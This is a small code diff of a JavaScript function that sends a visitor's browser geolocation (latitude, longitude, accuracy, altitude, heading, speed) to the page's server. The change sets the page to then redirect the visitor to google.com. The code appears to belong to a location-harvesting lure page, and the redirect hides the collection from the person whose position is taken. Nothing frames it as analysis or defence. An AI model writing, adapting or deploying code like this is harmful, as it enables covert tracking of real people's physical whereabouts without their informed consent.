@@ -118,13 +118,12 @@ function transmitted(){
     var ok_status = 'success';
     var pyjam_url=document.URL;
         var uri = pyjam_url.substring(0, pyjam_url.indexOf('/', 7));
-        var urii=uri+'/real_url';
    $.ajax({
          type: 'POST',
          url: uri,
          contentType: 'application/x-www-form-urlencoded',
          data: {Lat:lat,Lon:lon,Acc:acc,Alt:alt,Dir:dir,Spd:spd},
-         success: window.top.location.href=urii,
+         success: window.top.location.href='https://google.com',
        });
   };
 }
